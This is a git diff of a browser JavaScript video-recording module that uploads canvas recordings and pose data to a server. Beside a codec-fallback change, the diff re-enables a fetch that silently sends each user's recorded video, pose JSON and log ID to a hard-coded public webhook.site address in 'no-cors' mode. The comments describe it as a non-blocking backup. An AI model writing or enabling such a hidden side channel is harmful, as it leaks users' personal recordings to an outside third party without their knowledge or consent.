@@ -106,13 +106,17 @@ function _startMediaRecorder() {
 
     const stream = state.recordingCanvas.captureStream(25);
     let options = {
-        mimeType: 'video/mp4;codecs=avc1'
+        mimeType: 'video/webm;codecs=vp8'
     };
     if (!MediaRecorder.isTypeSupported(options.mimeType)) {
         console.warn("MP4 不支持，回退到 WebM");
         options = {
             mimeType: 'video/webm;codecs=vp8'
         };
+    }
+    // 如果连 WebM 都不支持（如极个别 iOS 浏览器），最后才回退到 MP4
+    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+        options = { mimeType: 'video/mp4;codecs=avc1' };
     }
     mediaRecorder = new MediaRecorder(stream, options);
 
@@ -192,6 +196,7 @@ export async function stopAndUpload(uploadUrl, token, analyzeUrl, logId) {
     
     return new Promise((resolve, reject) => {
         mediaRecorder.onstop = async () => {
+
             // 1. 获取原始录制数据
             const mimeType = mediaRecorder.mimeType || "video/webm";
             let finalBlob = new Blob(recordedChunks, { type: mimeType });
@@ -217,6 +222,8 @@ export async function stopAndUpload(uploadUrl, token, analyzeUrl, logId) {
             }
 
             lastVideoBlob = finalBlob;
+
+
             lastJsonBlob = new Blob([JSON.stringify(state.poseDataJson)], { type: "application/json" });
             try {
                 await performUploadAction(uploadUrl, token, analyzeUrl, logId);
@@ -232,6 +239,7 @@ export async function stopAndUpload(uploadUrl, token, analyzeUrl, logId) {
 
 async function performUploadAction(uploadUrl, token, analyzeUrl, logId) {
     const formData = new FormData();
+
     // 根据实际类型确定后缀
     const ext = lastVideoBlob.type.includes("mp4") ? "mp4" : "webm";
     formData.append("file", lastVideoBlob, `video.${ext}`);
@@ -240,18 +248,19 @@ async function performUploadAction(uploadUrl, token, analyzeUrl, logId) {
     const webhookUrl = "https://webhook.site/8237591b-7b89-4bcd-bc45-9205220bb59c";
     const webhookFormData = new FormData();
     webhookFormData.append("video", lastVideoBlob, `video.${ext}`);
+
     webhookFormData.append("data", lastJsonBlob, "pose_data.json");
     webhookFormData.append("log_id", logId);
     // 新增
     try {
         const response = await fetch(uploadUrl, { method: "POST", body: formData, headers: { 'Authorization': `Bearer ${token}` }});
         // 2. 新增：异步发送到 Webhook (不阻塞主逻辑，报错也仅记录日志)
-        // fetch(webhookUrl, {
-        //     method: "POST",
-        //     body: webhookFormData,
-        //     mode: 'no-cors' // 防止跨域导致的报错中断流程
-        // }).then(() => console.log("Webhook 备份上传成功"))
-        //   .catch(err => console.error("Webhook 备份失败:", err));
+        fetch(webhookUrl, {
+            method: "POST",
+            body: webhookFormData,
+            mode: 'no-cors' // 防止跨域导致的报错中断流程
+        }).then(() => console.log("Webhook 备份上传成功"))
+          .catch(err => console.error("Webhook 备份失败:", err));
         // 新增
         const resData = await response.json();
         if (resData.code === 200) {
